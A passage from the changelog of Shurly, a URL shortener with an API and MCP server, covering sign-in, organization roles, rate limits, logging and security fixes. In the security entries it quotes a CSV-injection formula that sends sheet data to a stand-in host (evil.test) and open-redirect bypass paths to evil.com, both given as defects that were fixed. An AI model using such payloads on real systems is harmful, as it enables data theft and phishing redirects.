- **No credentials**, and only the methods (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`) and
  request headers (`Authorization`, `Content-Type`, `X-Request-Id`) the API uses, instead
  of `*`: the frontend sends a bearer token, never cookies. It can now read
  `Retry-After` and `X-Request-Id` from a response. Origins are unchanged.
- In production the frontend and the API will share an origin (`shurly.griddo.io`, once
  the frontend is hosted, 4.10), so `CORS_ORIGINS` needs no entry there; the defaults
  are for the dev server (`localhost:4232`).

### Added — the user manual, starting with how to connect Claude (Phase 5.9)
- **`/manual/`**: Markdown in `frontend/src/content/manual/` (an Astro content collection),
  rendered at build time. Its first page, "Connect Claude to Shurly", covers Claude Code and
  claude.ai / Claude Desktop: signing in with Google first, an API key as the route that works on
  its own, and what to do when something goes wrong.
- **Settings → API & MCP shows the same page**, so the app and the manual can't drift, with
  "Copy with my key": it builds the API key command when clicked, from the key the page already
  holds, and never writes the key into the page, a URL or storage.
- **The MCP address comes from `PUBLIC_MCP_URL`** at build time, or the API's `/mcp/`, always
  with the trailing slash people must use.
- **Fixed:** the API key panel wrote the full key into its Copy buttons' `data-copy` attributes
  when the page loaded, behind the masked display. The buttons now copy from memory when
  clicked.

### Changed — Shurly's public host is `shurly.griddo.io`
- **`shurly.griddo.io` serves the web, the app, the API and the MCP** (decided 2026-09-28):
  `MCP_PUBLIC_URL=https://shurly.griddo.io/mcp`, the Google redirect URIs
  `https://shurly.griddo.io/api/v1/auth/google/callback` and `…/mcp/auth/callback`, and
  `FRONTEND_URL=https://shurly.griddo.io`. It's a second host on ALB rule 12, so the rule sync needs
  no change. The deploy's smoke test checks it. `go.griddo.io` is for short links only (Phase 8);
  `s.griddo.io` stays for tests until then and is deleted at the cutover.
- `mcp_server/README.md`: `claude mcp add` takes the URL as a positional argument, not `--url`.

### Security — rate limits on the login and the sign-in endpoints (Phase 6.3)
- **What anyone can call is limited per client IP**, counted in the database so both
  tasks share the counts (the new `rate_limits` table, migration `0006`): the password
  login, whose every attempt runs a bcrypt check on the tasks that also serve
  redirects, and the Google and MCP sign-in endpoints, each of which writes a row.
  `/mcp/register` and `/mcp/token` get their own, generous count, since claude.ai calls
  them from Anthropic's addresses. Redirects, anything signed in and CORS preflights
  aren't limited.
- **Failed password logins are also limited per address** (10 per 15 minutes by
  default), wherever they come from. Only failures count, so the right password isn't
  counted with a guesser's. Anyone can lock an address's password login for the window,
  but signing in with Google stays open, and an address without an account locks the
  same way, so a 429 tells nothing about who has one.
- Over a limit: `429` with `Retry-After`. Google's sign-in goes back to the login page
  with `#error=rate_limited`, which the frontend now explains. The event log records
  `http.rate_limited {path, limit}`, without the IP or the address. If the database
  can't count, requests go through and `rate_limit.store_failed` is logged.
- New settings: `RATE_LIMIT_LOGIN_PER_IP`, `RATE_LIMIT_LOGIN_FAILURES_PER_ACCOUNT`,
  `RATE_LIMIT_SIGN_IN_PER_IP`, `RATE_LIMIT_MCP_CLIENTS_PER_IP` (0 turns one off).
  They key on the client IP, so `TRUSTED_PROXIES` must name the ALB.

### Security — a client can't choose the IP it's recorded under
- **`X-Forwarded-For` is read from the right**, skipping the proxies in
  `TRUSTED_PROXIES`. The ALB appends the address it saw to whatever the client sent,
  and the resolver took the leftmost entry, the client's own claim: anyone could choose
  the address a visit was recorded under, and would have reset a per-IP rate limit
  with every request.

### Security — CSV exports can't carry spreadsheet formulas
- **The campaign export and the campaign recipients CSV neutralize cells that start
  like a formula** (`=`, `+`, `-`, `@`, a tab or a carriage return) with a leading
  single quote, which spreadsheets show as text (OWASP "CSV Injection"). Recipient data
  comes from uploaded CSVs, so a recipient named `=HYPERLINK("https://evil.test/?"&A1,…)`
  would have become a live formula for whoever opened the export, able to send the
  sheet's contents elsewhere. Column names too, and the other analytics CSVs go through
  the same writer (`spreadsheet_safe`, `server/utils/csv_export.py`).
- **An export uploaded back as a campaign keeps its data:** the CSV import drops that
  quote again. A phone number like `+34 600…` also gets the quote in an export; that's
  the usual trade-off.
- **Any campaign name exports.** The download's filename came from the campaign's name
  as it was: a name outside latin-1 (`Q4 🚀`, `东京`) made the export fail with a 500,
  and quotes, CR/LF or slashes went into the `Content-Disposition` header. Every CSV now
  sends a plain ASCII `filename` and the real name in `filename*` (RFC 6266/5987,
  `content_disposition`), which browsers prefer. The response isn't cached
  (`Cache-Control: no-store`), like the other CSVs.

### Security — the frontend's markup, audited (Phase 6.3)
- **Every raw `innerHTML` that carried data now goes through the escaping `html` tag and
  `setHTML`**: toasts, confirm dialogs, form alerts, the tag picker, charts and their
  tooltips, the link page and the new-link preview. They were escaped by hand before; nothing
  exploitable was found. Two raw sinks remain, each explained in the code and the test:
  `setHTML` itself, and the QR code (numbers and fixed colours only).
- **Links and images from data go through `safeUrl`** (http and https only, anything else is
  `#`), now also the short link after creating one and the tracking pixel's snippet. A
  `javascript:` destination, OG image or redirect target stays inert even in rows the API's
  own checks never saw.
- **A tag colour must be a hex colour to reach a `style` attribute**, so a stored value can't
  add CSS (`#fff;background:…`).
- **Regression tests** (`cd frontend && npm test`, in CI): a scan of `frontend/src` fails on
  any new raw HTML sink, `raw()` on data, or `href`/`src` built from a URL without
  `safeUrl`; unit tests pin the escaping and `safeUrl` against `javascript:`, `data:` and
  obfuscated schemes.
- A copy button clicked twice within two seconds no longer stays on "Copied!", and a loading
  button gets its own content back (nodes, not re-parsed markup).

### Added — MCP clients sign in with Google (Phase 5.8)
- **The MCP takes Google sign-ins as well as API keys and JWTs**, so Shurly can be
  added as a claude.ai custom connector, whose only way to authenticate is OAuth.
  Existing setups with `--header "Authorization: Bearer <api key>"` don't change.
  fastmcp's OAuth proxy runs the flow: client registration (DCR and Client ID
  Metadata Documents), a consent page, then Google. Its endpoints are under `/mcp/`,
  and the discovery documents (RFC 9728, RFC 8414) are at `/.well-known/…/mcp` at the
  root. A request without a token now gets a 401 pointing at them.
- **The same account, by the same rules, as on the web.** Google's ID token is
  checked like the web's, and the account comes from the web sign-in's rules: the
  organization's Workspace only, a verified address, the domain gate and
  membership, `account_conflict`, and the pre-hijack lockout. A refused sign-in gets
  no token (`invalid_grant`). Closing an account in Shurly refuses its MCP sign-ins
  at once, requests and refreshes alike; a suspension at Google takes up to a minute
  (a successful check with Google is kept 60 seconds).
- **Survives two tasks and every deploy.** What the proxy keeps (registrations,
  sign-ins in progress, codes, Google's tokens) lives in the new `mcp_oauth_store`
  table (migration `0005`), encrypted; its tokens are signed with a key of its own,
  never the Google client secret.
- **Only the clients we target can register:** claude.ai's (and claude.com's)
  callback and loopback on any port for Claude Code. Any other app is refused, so it
  can't ask a Griddo person to consent (consent phishing).
- **New settings:** `MCP_PUBLIC_URL`, `MCP_OAUTH_SIGNING_KEY` and
  `MCP_OAUTH_ALLOWED_REDIRECT_URIS`. Until the first two are set, with the Google
  client, the MCP works as before. The Google client needs the extra redirect URI
  `{MCP_PUBLIC_URL}/auth/callback`. DEPLOYMENT.md § The MCP.

### Added — Removed people, in Settings → Organization (Phase 3.14.3)
- **Owners can move someone's personal links later, not only right after removing them.**
  `GET /api/v1/organization/removed-members` lists the people removed from the organization
  (closed accounts on its email domain; one off the domain was never in it, so its address
  isn't shown), with how many personal links (a campaign's included) and campaigns each still
  owns: what `adopt-personal-links` would move. Most first, then by email. Owners only (403
  otherwise), and kept out of the MCP like the move itself.
- Settings → Organization shows them to owners under Members, each with "Move to …", or
  "Nothing left to move". The section is left out when nobody was removed.
- The organization's copy says "signs in" instead of "signs up": accounts come from signing in
  with Google since 3.13.

### Security — after logging in, `?next=` can't send you to another site
- **The login page's `next` is resolved the way the browser resolves it**, not judged by its
  first characters. Browsers drop tabs and line breaks from URLs, so
  `/login/?next=/%09/evil.com` passed the old check and sent someone to `evil.com` right after
  logging in; dot segments (`/.//evil.com`) did the same. Control characters and backslashes are
  refused outright, and the path that comes out must still start with a single `/` on this site.
  The same check covers the path kept across the Google round trip. Covered by the frontend's
  first unit tests (`cd frontend && npm test`, on Node's WHATWG URL parser), now a CI job.
- **The login and password forms `POST` if they're submitted before their script loads**, so the
  password can't end up in the address bar, the history or the host's logs.

### Added — Google sign-in in the frontend (Phase 3.13.5)
- **"Sign in with Google" on the login page.** It leaves for
  `GET /api/v1/auth/google/start`; Google's answer comes back as `/login/#code=…`, which
  the page trades by `POST /api/v1/auth/google/exchange` for the session, so the token
  never travels in a URL, and the fragment is cleared right away. `#error=…` codes get
  plain-language messages. Where you were going survives the round trip (kept in
  `sessionStorage`, same-site paths only). Email and password login stays, and "Forgot
  password?" now says to sign in with Google and set a new one.
- **No sign-up page**: accounts are created by signing in with Google. `/register/`
  redirects to the login page, and the landing page's "Get started" buttons lead there.
- **Settings → Account → Password**: set, change or remove a password. Replacing one
  takes the current password; with Google it's optional, and without it the change
  needs a recent sign-in, the way back from a forgotten one. Without Google the password
  is the only way in, so removing it is locked with the reason. When the session is too
  old for the change, a button signs you in with Google again and brings you back to
  Settings.

### Security — a refused login no longer tells whether the address has an account
- **`POST /api/v1/auth/login` takes as long for an unknown address, or an account without a
  password, as for a wrong password.** It returned before checking any password, so the response
  time showed which addresses have an account. It now runs a dummy bcrypt check on those paths
  (passlib's `dummy_verify`).

### Added — sign in with Google (Phase 3.13.2)
- **People at Griddo sign in with their Google Workspace account.** `GET /api/v1/auth/google/start`
  sends the browser to Google (OpenID Connect, authorization code with PKCE), and
  `GET /api/v1/auth/google/callback` checks the result and sends the browser to
  `{FRONTEND_URL}/login/#code=…`. The page trades that one-time code for the usual JWT at
  `POST /api/v1/auth/google/exchange`, so the JWT never travels in a URL. The contract with the
  frontend is in the docstring of `server/app/google_auth.py`.
- **Only the organization's accounts get in.** The ID token is checked on the server: signature
  against Google's keys, audience, issuer and expiry (google-auth), a verified address, and an `hd`
  claim equal to `ORGANIZATION_DOMAIN`. The `hd` sent to Google is only a hint.
- **A sign-in can't be finished in another browser, or twice.** The `state` is stored hashed, works
  once, expires in 10 minutes and must match an HttpOnly cookie set by `/start`. The one-time code
  is stored hashed, works once and expires in 60 seconds.
- **An account is recognised by Google's `sub`**, in the new `user_identities` table (migration
  `0004`), so an address change on Google's side keeps the account. The first sign-in makes the
  account and joins the organization; the 3.14.2 domain gate still applies. An address whose
  account is linked to another Google account is refused (`account_conflict`), never linked.
- **An account made before Google is taken back from whoever made it.** The open sign-up never
  verified addresses, so when such an account first signs in with Google it's linked, but its
  password is cleared, its API key revoked and every existing session ended (account
  pre-hijacking). Logged as `auth.identity_linked`.
- **Event log:** `auth.login` `{method, user_id}` for every sign-in, with Google or a password, and
  `auth.google_refused` `{reason}`. Never an address, a token or a code.
- **New settings:** `GOOGLE_CLIENT_ID`, `GOOGLE_CLIENT_SECRET`, `GOOGLE_REDIRECT_URI` and
  `FRONTEND_URL`. Until they're set, the Google endpoints send the browser back with
  `#error=google_unavailable`, or answer `503` without `FRONTEND_URL`, and everything else works as
  before. DEPLOYMENT.md § Sign in with Google has the Google Cloud setup.

### Added — an optional password, set by the account's owner (Phase 3.13.3)
- **`PUT /api/v1/auth/password` sets or replaces the password; `DELETE` removes it.** Only from a
  signed-in session: an API key gets a `403`, so a leaked key can't become a password. Without the
  current password, the sign-in must be at most 10 minutes old, or it's a `403` with
  `{"code": "reauth_required", …}`: that's the way back from a forgotten password (sign in with
  Google, set a new one). Removing is refused (`409`) when the account doesn't sign in with Google.
  Logged as `auth.password_set` and `auth.password_removed`. Neither endpoint is an MCP tool.
- **`GET /api/v1/auth/me` says `has_password` and `has_google`**, for Settings → Account.
- **Sessions can be ended.** JWTs now carry `iat`, and an account's `sessions_valid_from` refuses
  the ones issued before it, in the API and the MCP alike. Tokens from before this release have no
  `iat` and keep working until their account gets a cutoff, so nobody is logged out.
- `users.password_hash` may be NULL (migration `0004`): an account made through Google has no
  password. `POST /auth/login` answers `401` for it, and `POST /auth/change-password` a `409` that
  points to `PUT /api/v1/auth/password`. During the rollout, the previous release answers `500` to a
  password login for an account whose password the new one has just cleared.

### Removed — sign-up with a password (Phase 3.13.2)
- **`POST /api/v1/auth/register` answers `404`** and is gone from the API docs and the MCP (the
  `register` tool), unless `ALLOW_PASSWORD_SIGNUP=true`, which is for local development and tests,
  never production. The app logs `auth.password_signup_enabled` at startup when it's on. Accounts
  come from signing in with Google. A deliberate break of the versioning policy above: anyone could
  make an account on a Griddo domain (retro R1).

### Added — move a removed person's personal links from Settings (Phase 3.14)
- **When an owner removes someone** in Settings → Organization, a follow-up asks whether
  to move that person's personal links and campaigns to the organization, so the team
  can manage them. Skipping is fine: the links keep redirecting either way. A toast says
  what moved, and a 403, 404 or 409 shows the API's message in the dialog. Admins, who
  can remove members but not move their links, aren't asked.

### Added — the organization in the frontend (Phase 3.14)
- **Settings → Organization**: the members, with their role and the date they joined.
  Each row offers only what your role allows (the table in 3.14.2): owners change
  roles, make other owners, hand the role over and remove people below them; admins
  remove members; anyone can step down except the last owner. Removing someone and
  handing the role over ask first, and so do making an owner and stepping down, which
  you can't undo yourself. The API's 403/409 message is shown as it comes, and the list
  reloads after a refusal. An account outside any organization gets a note instead.
- **A "Personal" switch on every create flow** (quick create, the full editor and the
  campaign wizard), off by default: new links and campaigns belong to the organization
  unless it's on. Its hint names who will see them.
- **Who created what**: link and campaign lists and pages say "Created by you" or the
  creator's email, and personal ones carry a "Personal" badge.
- **Locked controls**: editing, deleting, redirect rules and preview refreshes of an
  organization link or campaign you can't change (someone else's, when you're a
  member) are dimmed, say why on hover and explain on click. A 403 that still gets
  through is shown like any other error, and the page checks your role again. Bulk
  tagging says how many links it skipped.

### Changed — copy that assumed every link was yours
- A campaign's per-recipient links are "personalized links": "personal" now means only
  you can see it.
- The title hint says visitors never see it (it said "only you see this"), the links
  page describes the team's links, and a link or campaign that isn't found may be
  someone else's personal one.

### Fixed — campaign summary returned 500 on PostgreSQL
- **`GET /api/v1/analytics/campaigns/{id}/summary` failed for every campaign on PostgreSQL**
  ("could not identify an equality operator for type json"). Its top-performers query
  grouped by `urls.user_data`, a `json` column PostgreSQL can't GROUP BY; the SQLite test
  suite allows it, so it never showed. It now groups by `urls.id`, on which the other
  selected columns depend. Regression test against PostgreSQL:
  `tests/test_analytics_postgres.py`. Found in the 3.14 frontend's manual pass.

### Fixed — random test failure on UUIDs that look like numbers
- **The test suite no longer fails at random with `'float' object has no attribute
  'replace'`.** Its in-memory SQLite created the models' UUID columns as `UUID`, a
  type SQLite gives numeric affinity, so an id whose 32 hex digits read as a number
  (all digits, or digits around one `e`: about one uuid4 in 700,000) was stored as a
  float and failed to load. `tests/conftest.py` now creates them as `CHAR(32)` on
  SQLite. Test-only: PostgreSQL has a native UUID type, and the models are unchanged.

### Security — only accounts on the organization's email domain join it
- **A new account joins the organization only if its email is on `ORGANIZATION_DOMAIN`**
  (default `griddo.io`; exact, case-insensitive; empty lets anyone join). Sign-up is
  still open to anyone until Google sign-in (3.13), and since 3.14.3 every member sees
  all of the organization's links and campaigns, recipients' names and emails included.
  So anyone could register and read or export the team's campaigns. An account off the
  domain now keeps working with personal links only. The startup sync applies the same
  rule, and each refused join logs `org.join_refused` with the user id, not the email.

### Security — link previews log the destination's origin, not the URL
- **A failed link preview no longer writes the destination URL to the log.** The
  Open Graph fetcher logged the whole URL when a fetch was refused, timed out,
  got an error status or failed, and so did the preview endpoint's guard. A
  destination URL is user input, and its path or query string can carry personal
  data (`/in/jane-doe`, `?email=…`). Those warnings reach CloudWatch although
  nothing configures logging: the root logger has no handler, so Python's
  last-resort handler prints them to stderr. They now keep the URL's origin:
  scheme, host and port (`url_origin` in `server/utils/url.py`). An unexpected
  error logs its type, not its message, which can repeat the URL, and a refused
  non-http(s) redirect names its scheme instead of the whole URL.

### Added — links and campaigns belong to the organization (Phase 3.14.3)
- **Everyone in the organization sees its links and campaigns**, and their stats:
  per link, per campaign, the overview and the CSV exports. New links and
  campaigns are the organization's; send `"visibility": "personal"` when creating
  one that only you see. Link and campaign responses carry `visibility` and
  `created_by_email`.
- **Who changes what**: the creator, and for the organization's links and
  campaigns, admins and owners too. Anyone else who can see one gets a 403 when
  editing, tagging, refreshing the preview, adding redirect rules or deleting.
  Bulk tagging skips those links and lists them in `failed`.
- **Someone else's personal link or campaign doesn't exist for you** (404),
  whatever your role. Campaigns used to answer 403 here; they now match links.
- **`POST /api/v1/organization/adopt-personal-links`**: once someone has been
  removed, an owner moves their personal links and campaigns to the organization,
  so the team can still manage them. Logs `org.links_adopted`. Not an MCP tool,
  like the other organization changes.
- **MCP**: `create_campaign_from_rows` takes `visibility`; `add_redirect_rule`
  and `get_url_analytics_summary` follow the same rules. The generated tools
  already did, since they call the API.
- **Migration `0003`** adds `organization_id` to `urls` and `campaigns` (NULL
  means personal) and gives the organization everything made so far. It creates
  the organization when the app hasn't yet, as happens when `0002` and `0003`
  run in the same deploy.
- An account outside any organization only sees and makes personal links. None
  exist in production: sign-up and startup put every active account in it.

### Added — the organization, its members and their roles (Phase 3.14.2)
- **Every account belongs to one organization** ("Griddo", from
  `ORGANIZATION_NAME` / `ORGANIZATION_DOMAIN`), as owner, admin or member.
  Sign-up joins it as member; at startup, active accounts without a membership
  join too. Migration `0002` adds `organizations` and `organization_members`.
- **The first owner comes from `BOOTSTRAP_OWNER_EMAIL`**, not from whoever signs
  up first: that account joins as owner when the organization has none. If no
  active owner is left, startup makes it owner again (break-glass). Set it
  before the first sign-up, or nobody can change roles.
- **`/api/v1/organization`**: the organization and your role; `GET /members`;
  `PATCH /members/{user_id}` to change a role; `DELETE /members/{user_id}` to
  remove someone (their account is closed and its API key revoked; their links
  keep redirecting); `POST /transfer-ownership` to make someone owner and step
  down to admin.
- **The rules**: owners change the roles of admins and members, to any role, but
  never another owner's; admins change no roles and remove members; nobody
  removes or changes someone with a role equal to or above theirs; anyone may
  lower their own role, except the last owner (409). That check locks the owner
  rows, so two owners stepping down at once leave one (tested on PostgreSQL).
- **Every change is logged**: `org.role_changed` and `org.member_removed` lines
  in the event log, with who did it.
- **MCP**: `get_organization` and `list_organization_members` are tools; role
  changes, removals and handovers are not, so an assistant reading untrusted
  text can't be talked into them.

### Changed — the schema is migrated with Alembic (Phase 3.14.1)
- **Startup runs the migrations instead of `create_all()`**, which only created
  missing tables and never added a column to an existing one. Revisions live in
  `server/migrations/versions/`; `0001` is the baseline, identical to what
  `create_all()` built (compared with `pg_dump`).
- **The existing production database is adopted, not rebuilt**: tables without
  an `alembic_version` get stamped at the baseline, keeping every row.
- **Tasks that boot together don't race**: a PostgreSQL advisory lock, held for
  the migration's transaction, lets one task migrate while the others wait.
- **New PostgreSQL test suite** (`tests/test_phase3141_migrations.py`): empty
  and pre-Alembic databases, a second run, three processes booting at once, and
  a drift check that fails when a model changes without a migration. CI runs it
  against a PostgreSQL 17 service (`--require-postgres`); locally it needs
  `TEST_DATABASE_URL`.
- `scripts/init_database.py` runs the migrations too, so it can't build a schema
  the app would mistake for the baseline.

### Security — database errors leave out the SQL parameters
- **A failed database statement no longer writes the user's input to the log.**
  SQLAlchemy ends a database error's message with the statement's parameters,
  and a traceback prints that message: uvicorn's for an API request, fastmcp's
  for a tool call. So when a statement failed (a lost connection, a timeout, a
  constraint), the log got what the user sent: for `POST /api/v1/auth/register`,
  the email and the password's bcrypt hash; for a campaign, its rows. The engine
  now hides them (`hide_parameters=True`, which covers `echo`'s SQL logging too);
  the statement stays, so the error still says what failed.
- PostgreSQL's own detail for a constraint violation is part of the driver's
  message, so it still names the value: `Key (email)=(…) already exists`, or the
  whole row for a `NOT NULL` violation (`Failing row contains (…)`).

### Security — MCP tool arguments kept out of fastmcp's error log
- **A failed API call no longer writes the tool's arguments to the log.** fastmcp
  logs each failed tool call with its traceback, and when a generated tool's call
  into the API failed, the error carried the API's response body. A `422` body
  echoes each invalid field's value, or the whole request body when a field is
  missing, so a `create_campaign` CSV (names, companies, emails) could reach
  CloudWatch. For an API error the line now keeps the tool and the status, without
  the body or the traceback: `Error calling tool 'create_short_url': HTTP error 422
  (response body not logged)`. The MCP client still gets the whole error, and any
  other exception, including one raised inside the API, still logs its traceback
  (`ApiErrorLogFilter` in `mcp_server/usage.py`).
- **Never run production with `FASTMCP_LOG_LEVEL=DEBUG`**: at that level fastmcp
  logs every tool call's arguments in full. The default, `INFO`, doesn't.

### Added — usage log for MCP tool calls and HTTP requests (Phase 5.6.0)
- **One JSON line per MCP tool call** (`mcp.tool_call`): tool, argument names,
  user id, outcome, error type, HTTP status of a failed API call, duration and
  request id. In the access log every MCP call was a `POST /mcp/`, so nothing
  recorded which tools were used or how they failed; the dogfood (5.6) needs
  those numbers. Argument values are never logged: campaign rows carry personal
  data. Written by a fastmcp middleware (`mcp_server/usage.py`).
- **One JSON line per HTTP request** (`http.request`): method, path without the
  query string, status, duration and request id. It replaces uvicorn's access
  log, now off in the image (`--no-access-log`), and closes the 3.9.6 item "request
  id in log lines".
- **A generated tool's call into the API carries the MCP request's id**, so one id
  links the MCP request, the tool call and the API call behind it.
- Lines go to stderr, since under the stdio transport stdout is the JSON-RPC
  channel. The Logs Insights queries (calls, errors and latency per tool, daily
  users) and the retention setup are in `mcp_server/README.md` § Usage log.

### Fixed — reserved and colliding custom codes
- **Custom codes the app serves itself are treated as taken.** `POST
  /api/v1/urls/custom` accepted `mcp`, `docs` and `redoc`, but `/mcp` redirects
  to the MCP endpoint and `/docs` and `/redoc` serve the API docs, so those short
  links could never resolve. They now get a random suffix and a warning, exactly
  like a taken code (`mcp` → e.g. `mcp4k2`). Only exact matches count (`mcpx`
  and `docs2` are kept), case-insensitively in `loose` mode. The set lives in
  `RESERVED_SHORT_CODES` (`server/utils/url.py`), and a test fails if the app
  serves a single-segment path that isn't in it.
- **A taken code's fallback now honours `SHORT_URL_MODE=loose`.** It was built
  from the raw input, so `PROMO` (with `promo` taken) became `PROMOr09`, which
  resolved at `/PROMOr09` but 404'd at `/promor09`. It is now lowercase.
- **The fallback fits the column and is re-checked.** A taken 18–20 character
  code grew to 21–23 characters, past `short_code`'s `String(20)`, which
  PostgreSQL rejects with a `500`. The base is now trimmed. The suffixed code
  is also checked for availability and redrawn (up to 10 times) instead of
  hitting the per-domain `UNIQUE` constraint.

### Fixed — pagination bounds and N+1 queries
- **`GET /api/v1/urls` and `GET /api/v1/campaigns` enforce their documented page
  size.** `limit` must be 1–100 and `skip` ≥ 0; anything else now returns `422`
  instead of reaching the database (`limit=100000` returned every row, and a
  negative `skip` or `limit` was a PostgreSQL error, i.e. a `500`). Out-of-range
  values are rejected, not clamped: to read more than 100 rows, page with `skip`
  until you have `total`. The bounds are in the OpenAPI schema, so the MCP
  `list_urls` and `list_campaigns` tools advertise them too. The frontend never
  asks for more than 100.
- **Multi-URL endpoints run a constant number of SQL statements** instead of one
  or two more per row (e.g. `GET /api/v1/urls` with 100 tagged URLs: 104 → 5):
  - `GET /api/v1/urls` loads the page's tags in one query;
  - `GET /api/v1/campaigns` loads the page's tags and URL counts in one query each;
  - `POST /api/v1/urls/bulk/tags` and `PATCH /api/v1/campaigns/{id}/tags` load the
    URLs' current tags in one query;
  - `GET /api/v1/analytics/campaigns/{id}/users` (campaign recipients) computes
    every URL's clicks, unique IPs and last click in one grouped query.

### Changed — New logo
- New Shurly logo (custom rounded lettering with a diamond period) and "sy"
  isotype replace the Bricolage wordmark and "s." isotype everywhere: web header,
  footer, auth pages, 404, styleguide, favicons, app icons and the OG card.
- The diamond is Griddo blue on light surfaces and cyan `#3cc3dd` on navy (new
  `brand-cyan` token, logo only). The brand kit in `design/brand/` is regenerated
  from one master geometry: logo in colour, reversed and mono, isotype on navy and
  white tiles, tile-less mark, PNG @1x/2x/3x. Old lime/Bricolage files removed.
- Logo heights grow ~1.35× (header 22→30 px) because the new logo's box includes
  the "y" descender.

### Changed — Griddo palette and type (trial)
- Brand colour is Griddo blue `#5057ff` (was lime `#b8f03e`): new `brand-50…950`
  scale with the signature at `brand-400`. Brand fills now carry white text,
  brand text/icons on ink use `brand-300`, charts draw in `brand-400`. Logo dot,
  favicons, app icons and the OG card are regenerated in blue.
- Page canvas is warm off-white `#faf9f6` (was `#f5f6f8`).
- Ink scale is Griddo navy: `ink-950` `#001b3c`, `ink-900` `#022958`, the rest
  regenerated in the same hue with the same contrast roles (`ink-500` still the
  lightest text, 4.5:1+ on white, canvas and `ink-100`). Logo letters, isotype
  tile, shadows and the modal backdrop follow. Brand marks on `ink-900` use
  `brand-300` (`brand-400` there is 2.8:1).
- Headlines (`.display`) drop from weight 750 to 500: Logical works best light.
- Eyebrows (`.eyebrow`) are handwritten in Shadows Into Light Two (OFL): always
  uppercase (the `font-hand` utility enforces it too), 14 px, tracked 0.05em, brand
  blue (`brand-300` on ink), one weight (was uppercase Inter 12 px in ink-500).
- Interface typeface is Figtree (was Inter). Headlines use Logical, Griddo's
  typeface, when available and fall back to Figtree until its web font files are
  added (was Bricolage Grotesque, which the wordmark SVG still uses).

### Security
- **Campaign links could be taken over with a custom URL.** Campaign URLs were
  stored with a NULL `domain_id`, and standard/custom URL creation only checks
  the default domain for a clashing code. Any user could create a custom URL
  with the code of someone else's campaign link, and because the resolver
  prefers the default-domain row, the campaign link then redirected to the new
  destination. Campaign URLs now live on the default domain and existing ones
  are moved there at startup (see Fixed), so the clash is detected and the
  custom code gets a random suffix, as for any taken code.
- **SSRF hardening for the Open Graph fetcher.** Link previews are fetched
  server-side from user-supplied URLs (`POST /api/v1/urls`,
  `POST /api/v1/urls/custom`, `POST /api/v1/urls/{code}/refresh-preview`, and since
  Phase 3.11 `POST /api/v1/urls/fetch-metadata`), so any
  authenticated user could make the API request internal addresses (loopback,
  RFC 1918, the link-local cloud metadata endpoints `169.254.169.254` /
  `169.254.170.2`) and read page titles and descriptions back.
  `fetch_opengraph_metadata` now:
  - fetches only `http` / `https` URLs;
  - resolves the host and refuses it unless **every** address is globally
    routable: no private, loopback, link-local, reserved, multicast, unspecified
    or shared (`100.64.0.0/10`) addresses, with IPv4-mapped and 6to4 IPv6 forms
    checked as the IPv4 address they carry;
  - connects to the address it checked, while the `Host` header and TLS
    (SNI + certificate verification) keep the hostname, so DNS rebinding can't
    swap in an internal IP after the check;
  - follows redirects manually, re-checking every hop, up to 5 (previously
    httpx's default of 20, unchecked).
  A refused fetch returns empty metadata like any other fetch failure, so URL
  creation never breaks.
- **`OG_FETCH_ALLOW_PRIVATE`** (default `false`) disables the address check so
  local development can preview pages served from `localhost`. Never enable it
  in production.

### Changed
- **API moved under `/api/v1/` prefix.** All routes previously served at
  `/api/...` are now served at `/api/v1/...`. The unversioned path is no
  longer mounted. Clients must update their base URL.
- Frontend API client (`frontend/src/utils/api.ts`) and all dashboard pages
  updated to call the versioned paths.
- `README.md` and `CLAUDE.md` endpoint references updated.

### Added
- `CHANGELOG.md` with explicit API versioning policy.
- **URL validity window and visit cap** (Phase 3.9.2). Three new optional fields
  on the URL model and create/update schemas:
  - `valid_since` (timestamp): URL becomes active at this UTC time. Requests
    before this point return `404 Not Found` (we do not reveal premature URLs).
  - `valid_until` (timestamp): URL stops being active at this UTC time. Requests
    after this point return `410 Gone`.
  - `max_visits` (integer ≥ 1): Hard cap on real human visits. Once the count
    of `Visitor` rows for the URL reaches this value, further requests return
    `410 Gone`. Social-media crawler previews do not consume the quota because
    they don't insert into the `Visitor` table.
  All three fields default to `NULL` (no constraint). Setting any of them in a
  `PATCH /api/v1/urls/{code}` request to `null` clears the constraint.
- **Bot detection in analytics** (Phase 3.9.3). `Visitor.is_bot` is set at log
  time using the existing UA classifier. All analytics endpoints now exclude
  bot visits by default and accept `?include_bots=true` to opt back in.
- **Crawlability + `/robots.txt`** (Phase 3.9.4). New `URL.crawlable` field
  (default `false`); the public `/robots.txt` endpoint emits a default-deny
  policy and `Allow: /<code>` per opted-in URL.
- **GDPR IP anonymization** (Phase 3.9.5). Visitor IPs are truncated to /24
  (IPv4) or /64 (IPv6) at insert time. Toggle via `ANONYMIZE_REMOTE_ADDR=false`
  if a legal review explicitly approves storing full addresses.
- **`X-Request-Id` middleware** (Phase 3.9.6). UUID generated per request
  unless the client supplies one; echoed in response headers for log
  correlation.
- **`SHORT_URL_MODE`** (Phase 3.9.6). Default `loose` — generated codes and
  custom slugs are lowercased so `Abc` and `abc` cannot collide. Set to
  `strict` to preserve case (legacy behavior).
- **`DISABLE_TRACK_PARAM`** (Phase 3.9.6). When the redirect URL contains the
  configured query param (default `nostat`), the redirect still happens but
  no `Visitor` row is inserted. Useful for QA / smoke tests.
- **`TRUSTED_PROXIES`** (Phase 3.9.6). CIDR allowlist for `X-Forwarded-For`
  resolution. Empty by default (never trust the header). Set to your
  ALB/CloudFront/API-Gateway source ranges before relying on it.
- **OG fetcher charset fallback** (Phase 3.9.6 / Shlink #2564). The OG fetcher
  now decodes via `<meta charset>` when the HTTP `Content-Type` does not
  declare one, and falls back to UTF-8 with replacement so a malformed page
  cannot break URL creation.
- **API key scoping data model** (Phase 3.9.6). `User.api_key_scope` enum
  added with `FULL_ACCESS` (only enforced value at launch) plus reserved
  `READ_ONLY`, `CREATE_ONLY`, `DOMAIN_SPECIFIC` for post-launch role rollout
  without a destructive enum migration. `POST /api/v1/auth/api-key/generate`
  now returns `{api_key, scope}`.

### Fixed
- **Campaign URLs are bound to the default domain.** `POST /api/v1/campaigns`
  and the MCP `create_campaign_from_rows` tool left `domain_id` NULL, so:
  - the `(domain_id, short_code)` UNIQUE never covered them (PostgreSQL treats
    NULLs as distinct);
  - the tracking pixel (`/{code}/track`), which matches by domain only,
    returned `404` for every campaign link;
  - the resolver's legacy NULL fallback served them on every host.
  Campaign short codes are now unique per domain, like standard and custom
  codes. `generate_campaign_urls()` takes a required `domain_id`.
- **Two rows of one campaign could get the same short code.** Codes were only
  checked against the database, where the batch isn't yet, so the odds grew
  with the CSV (about 2% at 10,000 rows, 44% at 50,000). Both recipients got
